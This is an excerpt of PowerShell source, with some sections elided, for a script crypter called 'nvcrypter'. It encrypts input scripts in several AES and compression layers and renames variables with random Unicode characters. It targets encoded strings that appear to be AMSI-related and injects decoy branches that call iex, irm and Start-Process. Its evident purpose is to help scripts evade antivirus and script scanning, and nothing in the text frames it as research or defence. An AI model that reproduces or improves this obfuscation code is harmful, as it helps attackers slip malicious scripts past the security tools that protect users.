...
function confusekey {
    ...
    for ($i = 0; $i -lt $keycount; $i++) {
        ...
        $key = -join (1..$keylength | % { $alphabetarray[(Get-random -Minimum 0 -Maximum $alphabetsize)] })
...
function nvcrypter {
    [CmdletBinding()]
    param ([string] $nvi,[string] $nvo,[Parameter()][int] $iterations = 2)
    process {
        ...
        for ($i = 1; $i -le $iterations; $i++) {
            ...
            if ($compressiontype -eq "Gzip") {$compressionst = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {$compressionst = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)}
			...
			$nvaesm = New-Object "System.Security.Cryptography.AesManaged"
            ...
            $usedkeys += $b64key
            if ($state.logdetail) {log "[~]" "Used $paddingmode" -HighlightColor Gray}
            if ($state.logdetail) {log "[~]" "Used $compressiontype" -HighlightColor Gray}
            #log "[~]" "Used $b64key" -HighlightColor gray
            ...
            $nvcodealtna_shuffled = $nvcodealtna | sort {Get-random}
            $nvstubpre += $nvcodealtna_shuffled -join ''
            ...
            log "[+]" "Applied $i layer" -HighlightColor Green
        }
        ...
        if (($usedkeys | select -Unique | measure).Count -eq 1) {log "[!]" "All secure keys used were identical" -HighlightColor Red} else {log "[~]" "Different keys were used" -HighlightColor Gray
    }
        ...
        function charobf {
            ...
            function charkey {
                ...
                if (!($usedvars.Value -is [System.Collections.ArrayList])) {$usedvars.Value = @()}
                $basevar = $vars | Get-random
                while ($true) {
                    $length = Get-random -Minimum 32 -Maximum 65
                    $chars = "ابتثجحخدذرزسشصضطظعغفقكلمنهوي的一是不了人在有我他这中大来上国个说们为子和你地出道也时年得就那要下以生会自着去之过家学对可里后小么心多天而能好没把看起发成只如事行方所然家种事成者部都其些主样理她两高长机当从动同工使点明问力与アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンアイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンАаБбВвГгДдЕеЁёЖжЗзИиЙйКкЛлМмНнОоПпРрСсТтУуФфХхЦцЧчШшЩщЪъЫыЬьЭэЮюЯяΑαΒβΓγΔδΕεΖζΗηΘθΙιΚκΛλΜμΝνΞξΟοΠπΡρΣσΤτΥυΦφΧχΨψΩω"
                    $nvrandoms = -join (1..$length | % { $chars[(Get-random -Minimum 0 -Maximum $chars.Length)] })
                    $combinedVar = $basevar + $nvrandoms
                    if (!($usedvars.Value -contains $combinedVar)) {$usedvars.Value += $combinedVar;return $combinedVar}}}
            ...
            # Most of them aren't needed anymore, but i'll just leave them
            $nvtarg = @(
                ...
                '"=0WQFJHVTBXa6dkLu9UazNXZyBXbvNmLPlmLtVEVzl1U"','"==wcTVkcw12bDVEZ"','"W1RlWFQuRW5DT2RJbkdd"','"==COGRXV"','"n5WayR3U0V2R"','"==QWBJlUB9Ed"','\(\)\)','char'<#,'if\s*\(\s*\$'#>)
            $nvtargl = $lines.Where({ $_ -match ($nvtarg -join "|") })
            $nvtargl = $lines | ?{foreach ($pattern in $nvtarg) {if ($_ -match $pattern) { return $true }}return $false}
            if (!$nvtargl) {gc -Path $nvi | sc -Path $nvo;return}
            foreach ($lineIndex in 0..($lines.Count - 1)) {
                $linecon = $lines[$lineIndex]
                foreach ($pattern in $nvtarg) {
                    if ($linecon -match $pattern) {
                        if ($state.logdetail) {log "[+]" "Line $($lineIndex + 86) - $pattern" -HighlightColor Green}
                        $modifiedc++}
                    }
                }
            foreach ($nvtarglsingle in $nvtargl) {
                ...
                if ($vars.Count -le $usedvars.Count) {$newRandVar = -join ((65..90) + (97..122) | Get-random -Count 5 | % { [char]$_ });$vars += $newRandVar}
                $randVar = charkey ([ref]$usedvars) -vars $vars
                $usedvars += $randVar
        ...
        if ($state.dead) {
            $deadtemplates = @(
                'if ($${v1}) { irm -Uri $${v2} }',
                'if ($${v1}) { iex $${v2} }',
                'if ($${v1}) { saps -FilePath $${v2} }',
                'if ($${v1}) { gc -Path $${v2} }',
                'if ($${v1}) { irm -Uri $${v2} -OutFile $${v3} }',
                'if ($${v1}) { iex $${v2} }',
                'if ($${v1}) { saps -FilePath $${v2} -ArgumentList $${v3} }',
                'if ($${v1}) { gc -Path $${v2} | Write-Output }'
            )
            log "[~]" "Adding dead branches" -HighlightColor Gray
            $deadbranches = @()
            $letters = 'n','o','v','e','r','s','e'
            foreach ($template in $deadtemplates) {
                $deadlet1 = ($letters | Get-Random -Count $letters.Count) -join ''
                $deadlet2 = ($letters | Get-Random -Count $letters.Count) -join ''
                $deadlet3 = ($letters | Get-Random -Count $letters.Count) -join ''
                $v1 = "$deadlet1$(nvrandom)"
                $v2 = "$deadlet2$(nvrandom)"
                $v3 = "$deadlet3$(nvrandom)"
                $branch = $template -replace '\$\{v1\}', $v1 -replace '\$\{v2\}', $v2 -replace '\$\{v3\}', $v3
                $deadbranches += $branch
            }
            $nvlines = $nvcode -split "`n"
            $insc = 8
            for ($i = 0; $i -lt $insc; $i++) {
                $deadbr = $deadbranches[$i]
                $inat = Get-Random -Minimum 0 -Maximum ($nvlines.Count + 1)
                $nvlines = $nvlines[0..($inat - 1)] + $deadbr + $nvlines[$inat..($nvlines.Count - 1)]
            }

            $nvcode = $nvlines -join "`n"
        }
        log "[+]" "Last character obfuscation" -HighlightColor Green
        $nvcode = charobf -nvcode $nvcode
        $nvcodeb = [System.Text.Encoding]::UTF8.GetBytes($nvcode)
        $stopwatch.Stop()
        log "[~]" "Writing content to output" -HighlightColor Gray
        [System.IO.File]::WriteAllText($nvo,$confusestart+$nvcode+$metadata,[System.Text.Encoding]::UTF8)
        try {
            log "[~]" "Updating content preview" -HighlightColor Gray
            $content.Text = gc $state.nvo -Raw
        } catch {
